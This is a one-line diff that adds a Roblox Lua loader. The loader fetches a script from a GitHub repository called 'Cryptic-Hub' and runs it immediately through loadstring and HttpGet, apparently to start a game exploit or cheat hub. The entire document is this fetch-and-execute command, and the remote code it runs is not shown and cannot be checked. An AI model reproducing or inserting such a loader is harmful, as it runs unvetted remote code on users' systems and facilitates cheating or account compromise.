@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CrypticModder/Cryptic-Hub/main/cryptic.wtf"))()
